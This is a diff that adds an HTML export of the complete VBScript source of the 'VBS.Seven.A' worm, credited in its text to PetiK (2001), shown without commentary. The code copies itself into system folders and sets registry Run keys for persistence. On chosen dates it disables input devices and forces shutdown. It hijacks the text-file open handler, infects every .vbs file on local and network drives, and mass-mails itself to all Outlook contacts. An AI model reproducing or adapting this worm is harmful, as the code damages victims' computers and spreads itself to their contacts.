@@ -1,0 +1,163 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'VBS.Seven.A
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc6">=</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sys</span><span class="sc6">=</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">tmp</span><span class="sc6">=</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc7">SEVEN</span><span class="sc6">()</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SEVEN</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">org</span><span class="sc6">=</span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">org.Copy</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Seven.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">org.Copy</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\Envy.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">org.Copy</span><span class="sc6">(</span><span class="sc7">tmp&amp;</span><span class="sc4">"\Lust.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">run</span><span class="sc6">=(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Envy"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">runs</span><span class="sc6">=(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Lust"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">run</span><span class="sc6">,</span><span class="sc7">sys&amp;</span><span class="sc4">"\Envy.vbs"</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">runs</span><span class="sc6">,</span><span class="sc7">tmp&amp;</span><span class="sc4">"\Lust.vbs"</span><span class="sc0">
+</span><span class="sc7">First</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Second</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Third</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Disk</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Send</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">First</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">15</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">30</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">run2</span><span class="sc6">=(</span><span class="sc4">"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Anger"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">run2</span><span class="sc6">,</span><span class="sc4">"rundll32 mouse,disable"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">28</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"You're tired now"</span><span class="sc6">+</span><span class="sc7">VbCrLf</span><span class="sc6">+</span><span class="sc4">"Switch off you're Computer"</span><span class="sc6">,</span><span class="sc7">vbExclamation</span><span class="sc6">,</span><span class="sc4">"Seven"</span><span class="sc0">
+</span><span class="sc7">ws.Run</span><span class="sc0"> </span><span class="sc4">"rundll32.exe user.exe,exitwindows"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">14</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"The keyboard is on strike !"</span><span class="sc6">,</span><span class="sc7">vbInformation</span><span class="sc6">,</span><span class="sc4">"Seven"</span><span class="sc0">
+</span><span class="sc7">ws.Run</span><span class="sc0"> </span><span class="sc4">"rundll32 keyboard,disable"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Third</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">17</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">bur</span><span class="sc6">=</span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc3">not</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\COPYRIGHT.txt.vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">txt</span><span class="sc6">=</span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKCR\txtfile\shell\open\command\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCR\txtfile\shell\open\command\Pride"</span><span class="sc6">,</span><span class="sc7">txt</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCR\txtfile\shell\open\command\"</span><span class="sc6">,</span><span class="sc4">"wscript "</span><span class="sc6">&amp;</span><span class="sc7">win&amp;</span><span class="sc4">"\Seven.vbs"</span><span class="sc0">
+</span><span class="sc7">icot</span><span class="sc6">=</span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKCR\txtfile\DefaultIcon\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">icov</span><span class="sc6">=</span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKCR\VBSfile\DefaultIcon\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCR\VBSfile\DefaultIcon\oldicon"</span><span class="sc6">,</span><span class="sc7">icov</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCR\VBSfile\DefaultIcon\"</span><span class="sc6">,</span><span class="sc7">icot</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">copy</span><span class="sc6">=</span><span class="sc7">fso.CreateTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bur&amp;</span><span class="sc4">"\COPYRIGHT.txt.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">copy.WriteLine</span><span class="sc0"> </span><span class="sc4">"MsgBox ""You're infected by my new Worm""+VbCrLf+VbCrLf+""  By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""</span><span class="sc0">
+</span><span class="sc7">copy.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">copy</span><span class="sc6">=</span><span class="sc7">fso.CreateTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\COPYRIGHT.txt.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">copy.WriteLine</span><span class="sc0"> </span><span class="sc4">"MsgBox ""You're infected by my new Worm""+VbCrLf+VbCrLf+""  By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""</span><span class="sc0">
+</span><span class="sc7">copy.Close</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Disk</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc6">=</span><span class="sc7">fso.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">d.path&amp;</span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc6">=</span><span class="sc7">f.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cot</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">cot.ReadLine</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"'VBS.Seven.A"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">cot.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cot</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vbsorg</span><span class="sc6">=</span><span class="sc7">cot.ReadAll</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">cot.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">inf</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">inf.WriteLine</span><span class="sc0"> </span><span class="sc4">"'VBS.Seven.A"</span><span class="sc0">
+</span><span class="sc7">inf.Write</span><span class="sc6">(</span><span class="sc7">vbsorg</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">inf.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">inf.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set w=CreateObject(""WScript.Shell"")"</span><span class="sc0">
+</span><span class="sc7">inf.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set f=CreateObject(""Scripting.FileSystemObject"")"</span><span class="sc0">
+</span><span class="sc7">inf.WriteLine</span><span class="sc0"> </span><span class="sc4">"w.run f.GetSpecialFolder(0)&amp;""\Seven.vbs"""</span><span class="sc0">
+</span><span class="sc7">inf.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc6">=</span><span class="sc7">f.SubFolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc0">
+</span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Send</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">A</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">B</span><span class="sc6">=</span><span class="sc7">A.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">C</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">B.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">D</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc6">=</span><span class="sc7">C.AddressEntries</span><span class="sc6">(</span><span class="sc7">D</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc6">=</span><span class="sc7">A.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.To</span><span class="sc6">=</span><span class="sc7">E.Address</span><span class="sc0">
+</span><span class="sc7">F.Subject</span><span class="sc6">=</span><span class="sc4">"What is the seven sins ??"</span><span class="sc0">
+</span><span class="sc7">F.Body</span><span class="sc6">=</span><span class="sc4">"Look at this file and learn them."</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">G</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.Attachments.Add</span><span class="sc0"> </span><span class="sc7">G.BuildPath</span><span class="sc6">(</span><span class="sc7">G.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"Seven.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.DeleteAfterSubmit</span><span class="sc6">=</span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">F.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">F.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span></div></body>
+</html>
